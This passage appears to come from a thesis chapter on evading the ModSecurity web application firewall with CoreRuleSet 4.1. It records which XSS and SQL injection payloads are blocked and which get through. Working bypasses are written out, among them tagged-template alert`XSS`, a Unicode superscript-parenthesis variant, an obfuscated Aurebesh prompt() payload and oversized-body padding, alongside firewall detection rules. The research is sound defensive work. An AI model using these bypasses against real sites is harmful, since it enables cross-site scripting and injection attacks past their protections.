\subsection{Single Iteration Evaluation}
This chapter states the evaluation results of a single iteration of application of an evasion technique to the specified payloads. If a considerable (from the perspective of the author of this work) bypass was found, the result will be detailed. Evaluation results of blocked requests are referred to in attachment.


\subsubsection{Payload length}
As stated in Listing~\ref{lst:alertXSSblocked}, the payload \verb|alert('XSS')| is being blocked by the tested firewall.
Filling the request with filler data in the form: \\
\verb|/**aa..a**/alert('XSS')| \\
will cause the request to be blocked by ModSecurity without matching on any CoreRuleSet rule:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=request body bigger than maximum, label={lst:requesttoobig}]
<payload>/**aaa...(131052 more a)**/alert('XSS')</payload>
<message>"Failed to parse request body."</message>
<file>"/nginx/modsecurity.d/modsecurity.conf"</file>
<fileDetails>[line "76"] [id "200002"]<fileDetails>
<MatchedData>"Request body excluding files is bigger than the maximum expected."</MatchedData>
\end{lstlisting}

It takes exactly 131073 1-byte characters to reach this limit. If one less character is used in the request body, the ModSecurity firewall will match on \verb|alert(|, like in Listing~\ref{lst:alertXSSblocked}. This corresponds to the 131072 limit stated in the ModSecurity configuration file.


\subsubsection{Unicode in JSON}
\label{sec:unicodeinjsontest}
The ModSecurity firewall detects and blocks requests containing \verb|${| followed by a closing \verb|}| after an arbitrary number of characters in between.
Tests have shown that using Unicode encoding in JSON and substituting the \verb|$| in a JSON request with \verb|\u0024| evades the previously mentioned detection, but triggers another firewall rule: \\
\verb|Possible Unicode character bypass detected|.
(see Listing~\ref{lst:jsonunicodetests})

\subsubsection{Unicode Normalization}
The following payload using the function \verb|alert()| is being blocked by the ModSecurity Firewall:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert("normalizeMe") blocked, label=lst:alertnormalizemeblocked]
<payload>alert("normalizeMe")</payload>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"alert("</MatchedData>
<message>"Javascript method detected"</message>
\end{lstlisting}

If the opening \verb|(| is substituted with the "Superscript Left Parenthesis" (U+207D), the payload bypasses the filter:
\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert('normalizeMe') bypass, label=lst:alertnormalizemebypass]
<payload>alert("normalizeMe")</payload>
<bypass>alert\u{207D}'normalizeMe')</bypass>
\end{lstlisting}

Calling \verb|.normalize('NFKD')| on the bypassed string:\\ 
\verb|"alert\u{207D}'normalizeMe')".normalize('NFKD')| will convert the string to the original payload: \verb|"alert('normalizeMe')"|.


\subsubsection{Case Alternation}
As seen in Listing~\ref{lst:alertxssblocked}, the payload \verb|alert('XSS')| is being blocked. Similarly, the payload \verb|aLeRT('XSS')| is being blocked by the ModSecurity Firewall using CRS4.1. (Listing~\ref{lst:alertcasealternationblocked})

The specific warning that the firewall writes to its log on blocking the case-alternated payload gives a reason as to why the payload is being filtered:
\begin{lstlisting}[style=basicStyle, caption=ModSecurity warning on case alternated payloads, label={lst:modsecwarning}]
	ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?i)\b(?:eval|set(?:timeout|interval)|new[\s\x0b]+Function|a(?:lert|tob)|btoa|prompt|confirm)[\s\x0b]*\('
\end{lstlisting}
The \verb|(?i)| regex modifier at the beginning of the rule instructs the regex engine to ignore case.


\subsubsection{Comment Interference}
The example given by Ally Petitt \cite{medium/allypetitt} in Section~\ref{sec:commint} has been tested against the ModSecurity Firewall using CRS4.1. The original payload: \verb|?id=1+union+select+1,2,3--| is being blocked by the firewall (Listing~\ref{lst:sqliblocked}), as is the modified payload using Comment Interference: \verb|?id=1+un/**/ion+sel/**/ect+1,2,3--| (Listing~\ref{lst:commentinterferenceinsqlblocked}).

The fact that the ModSecurity Firewall using CRS4.1 blocks this specifically crafted payload does not proof that using Comment Interference will never make payloads bypass the firewall. No more research was conducted into this idea, therefore Comment Interference is not being considered when crafting bypassing payloads in multiple steps in the following section.


\subsubsection{Percent Encoding}
The ModSecurity firewall detects some percent-encoded payloads. Requests with plain as well as percent-encoded payloads were sent to the reverse proxy. All requests triggered the same rules. (See Listing~\ref{lst:urlencodedexampleblocked})


\subsection{Tagged Template Literals}
As stated in Listing~\ref{lst:alertXSSblocked}, the payload \verb|alert('XSS')| is being blocked by the tested firewall.
After substituting the function call using \verb|('XSS')| with a Tagged Template Literal in the form of \verb|alert`XSS`|, the payload successfully bypasses the firewall and reaches the web server. (Listing~\ref{lst:alertXSSbypass})

\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert("XSS") blocked, label=lst:alertXSSblocked]
<payload>alert("XSS")</payload>
<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"alert("</MatchedData>
\end{lstlisting}

\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert`XSS` bypass, label=lst:alertXSSbypass]
<payload>alert("XSS")</payload>
<bypass>alert`XSS`</bypass>
\end{lstlisting}

\subsection{JSFuck}
The payload \verb|alert('XSS')| has been sent to the Web Application and blocked (Listing~\ref{lst:alertXSSblocked}). Subsequently the payload was obscured using the service provided by JSFuck: https://jsfuck.com/ \\
The resulting payload is shown in Listing~\ref{lst:alertxssjsfuck}. The ModSecurity firewall using CRS 4.1 detects the JSFuck "encoding" and blocks the payload (Listing~\ref{lst:alertxssjsfuckblocked}).


\subsection{Aurebesh.js}
When sending the payload \verb|prompt()|, the ModSecurity firewall using CRS 4.1 detects the \gls{xss} attempt and blocks the request:
\begin{lstlisting}[style=ruleStyle, language=XML, caption=prompt(1\,2) blocked, label=lst:promptblocked]
<payload>prompt(1,2)</payload>
<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"prompt("</MatchedData>
\end{lstlisting}
If the Aurebesh technique is used to substitute most of the payload with the characters \verb|A-I| as well as \verb|() + [] ! ' = {}|, the obscured payload bypasses the firewall:
\begin{lstlisting}[style=ruleStyle, language=XML, caption=Aurebesh prompt bypass, label=lst:aurebeshpromptbypass]
<payload>prompt(1,2)</payload>
<bypass>A='',B=!A+A,C=!B+A,D=A+{},E=B[A++],F=B[G=A],H=++G+A,I=D[G+H],B[I+=D[A]+(B.C+D)[A]+C[H]+E+F+B[G]+I+E+D[A]+F][I]('p'+F+D[A]+'m'+'p'+E+'(A,++A)')()</bypass>
\end{lstlisting}


